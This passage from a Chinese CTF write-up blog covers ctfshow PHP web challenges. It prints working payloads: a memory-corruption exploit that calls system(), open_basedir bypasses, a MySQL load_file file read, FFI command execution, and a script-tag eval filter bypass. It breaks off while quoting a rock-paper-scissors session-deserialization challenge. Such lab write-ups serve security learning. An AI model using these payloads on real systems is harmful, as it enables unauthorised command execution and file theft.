punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$closure_obj</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$binary_leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't determine binary base address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$elf</span> <span class="token operator">=</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't parse ELF header"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span> <span class="token operator">=</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get basic_functions address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$zif_system</span> <span class="token operator">=</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get zif_system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$fake_obj_offset</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x110</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_obj_offset</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_obj</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_obj_offset</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$zif_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-&gt;</span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat /flag0.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020221123114845.png"></p><h2 id="32-web73-74"><a href="#32-web73-74" class="headerlink" title="32. web73-74"></a>32. web73-74</h2><p>这一题没有限制 open_basedir</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'glob:///*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-&gt;</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// /flagc.txt</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flagc.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="33-web75-76"><a href="#33-web75-76" class="headerlink" title="33. web75-76"></a>33. web75-76</h2><p>限制了 open_basedir，且之前的脚本无法使用</p><p>该题利用 PDO 连接 mysql ，然后使用 load_file 进行读取文件</p><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">try</span> <span class="token punctuation">{</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'mysql:host=localhost;dbname=ctftraining'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dbh</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select load_file("/flag36.txt")'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020221123120024.png"></p><h2 id="34-web77"><a href="#34-web77" class="headerlink" title="34. web77"></a>34. web77</h2><p>利用 FFI 命令执行</p><pre class="line-numbers language-none"><code class="language-none">$ffi = FFI::cdef("int system(const char *command);");//创建一个system对象$a='/readflag &gt; 1.txt';//没有回显的$ffi-&gt;system($a);//通过$ffi去调用system函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020221123121138.png"></p><p>然后访问 1.txt</p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF 秀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF 秀 - 新手杯</title>
      <link href="/2023/01/21/catchtheflag/ctf-xiu/ctf-xiu-xin-shou-bei/"/>
      <url>/2023/01/21/catchtheflag/ctf-xiu/ctf-xiu-xin-shou-bei/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-秀-新手杯"><a href="#CTF-秀-新手杯" class="headerlink" title="CTF 秀 - 新手杯"></a>CTF 秀 - 新手杯</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-easy-eval"><a href="#1-easy-eval" class="headerlink" title="1. easy_eval"></a>1. easy_eval</h3><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"?&gt;"</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要闭合掉 eval 才能执行命令，但是过滤掉了 ?，这里使用 &lt;script&gt; 进行绕过</p><p><a href="../../../ZDemo/PHP%20%E8%AF%AD%E8%A8%80/%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/PHP%20%E6%A0%87%E8%AE%B0.md">PHP 标记</a></p><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">[</span><span class="token constant">POST</span><span class="token punctuation">]</span>code<span class="token operator">=</span><span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string double-quoted-string">"php"</span><span class="token operator">&gt;</span> <span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`id`</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-剪刀石头布"><a href="#2-剪刀石头布" class="headerlink" title="2. 剪刀石头布"></a>2. 剪刀石头布</h3><p>查看页面源码获得提示</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- post 'source' to view something --&gt;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>POST 提交后获得题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Game</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$log</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$play</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">log</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/tmp/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.log'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">play</span><span class="token punctuation">(</span><span class="token variable">$user_input</span><span class="token punctuation">,</span> <span class="token variable">$bot_input</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Rock'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'&amp;#9996;&amp;#127995;'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Paper'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'&amp;#9994;&amp;#127995;'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Scissors'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'&amp;#9995;&amp;#127995;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">play</span> <span class="token operator">=</span> <span class="token variable">$user_input</span> <span class="token operator">.</span> <span class="token variable">$bot_input</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">play</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"RockRock"</span> <span class="token operator">||</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">play</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"PaperPaper"</span> <span class="token operator">||</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">play</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"ScissorsScissors"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">log</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;div&gt;"</span> <span class="token operator">.</span> <span class="token variable">$output</span><span class="token punctuation">[</span><span class="token variable">$user_input</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' VS '</span> <span class="token operator">.</span> <span class="token variable">$output</span><span class="token punctuation">[</span><span class="token variable">$bot_input</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" Draw&lt;/div&gt;\n"</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"Draw"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">play</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"RockPaper"</span> <span class="token operator">||</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">play</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"PaperScissors"</span> <span class="token operator">||</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">play</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"ScissorsRock"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">log</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;div&gt;"</span> <span class="token operator">.</span> <span class="token variable">$output</span><span class="token punctuation">[</span><span class="token variable">$user_input</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' VS '</span> <span class="token operator">.</span> <span class="token variable">$output</span><span class="token punctuation">[</span><span class="token variable">$bot_input</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" You Lose&lt;/div&gt;\n"</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"You Lose"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">play</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"RockScissors"</span> <span class="token operator">||</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">play</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"PaperRock"</span> <span class="token operator">||</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">play</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"ScissorsPaper"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">log</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;div&gt;"</span> <span class="token operator">.</span> <span class="token variable">$output</span><span class="token punctuation">[</span><span class="token variable">$user_input</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' VS '</span> <span class="token operator">.</span> <span class="token variable">$output</span><span class="token punctuation">[</span><span class="token variable">$bot_input</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" You Win&lt;/div&gt;\n"</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"You Win"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h5&gt;Game History&lt;/h5&gt;\n"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;div class='all_output'&gt;\n"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">log</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/div&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IE=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon.png<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Rock Paper Scissors<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- post 'source' to view something --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>style.css<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'win'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h5</span><span class="token punctuation">&gt;</span></span>Input your name :<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h5</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>result<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>input</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>submit<span class="token tag"><span class="token tag"><span 